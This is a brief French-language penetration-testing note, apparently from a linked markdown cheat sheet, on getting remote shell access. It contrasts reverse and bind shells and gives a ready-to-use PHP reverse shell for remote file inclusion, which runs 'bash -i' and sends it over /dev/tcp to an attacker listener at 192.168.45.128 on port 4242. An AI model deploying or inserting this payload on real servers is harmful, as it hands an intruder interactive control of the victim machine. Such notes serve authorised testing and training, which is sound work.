Nous pouvons forcer le serveur distant soit à nous envoyer un accès en ligne de commande au serveur [Reverse shell](./Reverse%20shell.md), soit à ouvrir un port sur le serveur auquel nous pouvons nous connecter afin d'exécuter d'autres commandes [Bind shell](./Bind%20shell.md).

Stabilisation de la coque avec [TTY](./TTY.md)


---

Reverse shell PHP (RFI)

```php 
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.128/4242 0>&1'"); ?>
```


